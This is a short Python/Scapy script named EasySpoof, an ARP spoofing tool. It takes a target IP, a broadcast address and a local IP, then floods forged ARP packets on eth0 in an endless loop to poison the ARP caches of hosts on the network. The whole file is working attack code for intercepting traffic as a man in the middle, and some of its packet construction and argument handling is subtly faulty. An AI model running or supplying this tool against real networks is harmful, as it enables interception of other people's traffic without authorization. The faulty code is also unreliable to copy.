#ARP spoof wheel tool

from scapy.all import *
from scapy.layers.l2 import *
import sys
import time

def run():
    global ip
    global bcast
    global sip
    ip = sys.argv[1]
    bcast = sys.argv[2]
    sip = sys.argv[3]
    if (ip and bcast):
        return
    else:
        print ('EasySpoof 1.0')
        print ('This version is no longer update!')
        print ('Usage:easyspoof Targetip Broadcast Localip')
        print ('[!]Invaild Parameter!')

def getmac(ip):
    print ('[*]Getting hwaddr of %s' % ip)
    resp,ans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = ip),timeout = 3,retry = 5)
    for s,r in resp:
        return r[Ether].src
    return  None

def init(ip,bcast,sip):
    global packet,bpacket
    try:
        print ('[*]Init ip...')
        packet = Ether(src=getmac(sip),dst = getmac(ip))/ARP(getmac(sip),hwdst = getmac(ip),pdst = ip , op = 1)
        bpacket = Ether(src=getmac(sip),dst = getmac(bcast))/ARP(getmac(sip),ip,hwdst = getmac(bcast),pdst = bcast ,op=1)
        return (packet,bpacket)
    except:
        print ('[!]Init Error!')
def main():
    while True:
        sendp(packet,inter=1,iface='eth0')
        sendp(bpacket,inter=1,iface='eth0')
        time.sleep(2)

if __name__ == '__main__':
    run()
    init(ip=ip,bcast=bcast,sip=sip)
    main()
